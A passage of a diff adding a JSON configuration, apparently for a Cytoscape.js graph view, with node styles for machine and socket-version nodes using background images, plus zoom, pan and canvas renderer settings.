+        "min-height": "160px",
+        "background-color": "#eee",
+        "background-image": "static/images/machine.png",
+        "background-image-opacity": "0.75",
+        "background-fit": "none",
+        "background-position-x": "20",
+        "background-position-y": "20",
+        "text-background-opacity": "0"
+      }
+    },
+    {
+      "selector": "node.socket-version",
+      "style": {
+        "shape": "rectangle",
+        "background-image": "static/images/socket.png",
+        "background-fit": "contain",
+        "background-opacity": "0",
+        "border-opacity": "0"
+      }
+    }
+  ],
+  "zoomingEnabled": true,
+  "userZoomingEnabled": true,
+  "zoom": 0.3685844069826863,
+  "minZoom": 1e-50,
+  "maxZoom": 1e+50,
+  "panningEnabled": true,
+  "userPanningEnabled": true,
+  "pan": {
+    "x": -438.65364385999567,
+    "y": -385.33599437560514
+  },
+  "boxSelectionEnabled": true,
+  "renderer": {
+    "name": "canvas"
+  }
+}
